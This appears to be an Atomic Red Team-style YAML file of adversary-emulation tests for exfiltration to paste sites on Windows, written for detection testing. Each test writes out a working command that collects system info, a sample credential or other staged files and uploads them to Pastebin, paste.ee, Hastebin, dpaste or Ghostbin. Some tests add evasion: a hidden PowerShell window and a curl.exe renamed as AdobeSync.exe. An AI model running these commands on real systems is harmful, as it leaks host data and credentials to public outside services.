attack_technique: T1567.003
display_name: "Exfiltration Over Web Service: Exfiltration to Text Storage Sites - Custom"

atomic_tests:
- name: PowerShell Upload Recon Output to Pastebin API
  auto_generated_guid: 1aa8f6a2-2ee7-4d05-9122-87772b0080b9
  description: |
    Collect local recon data and upload to Pastebin API using PowerShell.
  supported_platforms:
  - windows
  input_arguments:
    output_file:
      description: Temp recon file
      type: path
      default: C:\Users\Public\sysinfo.txt
  executor:
    name: powershell
    command: |
      systeminfo > "#{output_file}";
      Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -Method POST -Body @{api_dev_key="test";api_option="paste";api_paste_code=(Get-Content "#{output_file}" -Raw)}
    cleanup_command: |
      Remove-Item "#{output_file}" -ErrorAction Ignore

- name: Curl Upload Credentials File to Paste.ee
  auto_generated_guid: 002a8a65-1b61-4501-b122-05f663e6fdf5
  description: |
    Stage file and upload using native curl.exe.
  supported_platforms:
  - windows
  input_arguments:
    loot_file:
      type: path
      default: C:\Users\Public\creds.txt
  executor:
    name: command_prompt
    command: |
      echo admin:Winter2024!> "#{loot_file}" && curl.exe -X POST -F "file=@#{loot_file}" https://paste.ee/api
    cleanup_command: |
      del "#{loot_file}" >nul 2>nul

- name: Encoded PowerShell POST to Hastebin
  auto_generated_guid: 85cd70cc-7ed0-4e8b-855f-7e0c7e254a65
  description: |
    Use encoded PowerShell command to POST text to hastebin-like endpoint.
  supported_platforms:
  - windows
  executor:
    name: command_prompt
    command: |
      powershell.exe -WindowStyle Hidden -Command "$d='hostname='+$env:COMPUTERNAME;Invoke-RestMethod -Uri https://hastebin.com/documents -Method Post -Body $d"

- name: Archive Then Upload to dpaste
  auto_generated_guid: 8ec88af8-3f46-4b7e-9c77-8acaaa56166d
  description: |
    Compress staged data then upload through PowerShell web request.
  supported_platforms:
  - windows
  input_arguments:
    src_file:
      type: path
      default: C:\Users\Public\notes.txt
    zip_file:
      type: path
      default: C:\Users\Public\data.zip
  executor:
    name: powershell
    command: |
      Get-Process | Out-File "#{src_file}";
      Compress-Archive "#{src_file}" "#{zip_file}" -Force;
      Invoke-WebRequest -Uri "https://dpaste.com/api/v2/" -Method POST -InFile "#{zip_file}"
    cleanup_command: |
      Remove-Item "#{src_file}","#{zip_file}" -ErrorAction Ignore

- name: Renamed Curl Upload Browser History
  auto_generated_guid: 39f3fd3c-3e70-47f6-9e4f-7c16c5a5d9bf
  description: |
    Copy curl.exe to alternate name and upload staged file.
  supported_platforms:
  - windows
  input_arguments:
    fake_curl:
      type: path
      default: C:\Users\Public\AdobeSync.exe
    hist_file:
      type: path
      default: C:\Users\Public\history.txt
  executor:
    name: command_prompt
    command: |
      copy C:\Windows\System32\curl.exe "#{fake_curl}" && echo urls> "#{hist_file}" && "#{fake_curl}" -X POST -F "c=@#{hist_file}" https://paste.ee/api
    cleanup_command: |
      del "#{fake_curl}" >nul 2>nul & del "#{hist_file}" >nul 2>nul

- name: Bitsadmin Upload Inventory File to Ghostbin
  auto_generated_guid: d9600dcf-e20c-4b1c-9881-51d738d6b41e
  description: |
    Stage host inventory data and invoke BITSAdmin with a Ghostbin destination URL to emulate exfiltration over a text storage service.
  supported_platforms:
  - windows
  input_arguments:
    loot_file:
      type: path
      default: C:\Users\Public\inventory.txt
  executor:
    name: command_prompt
    command: |
      systeminfo > "#{loot_file}" && bitsadmin /transfer cachejob /upload /priority foreground "#{loot_file}" https://ghostbin.com/paste
    cleanup_command: |
      del "#{loot_file}" >nul 2>nul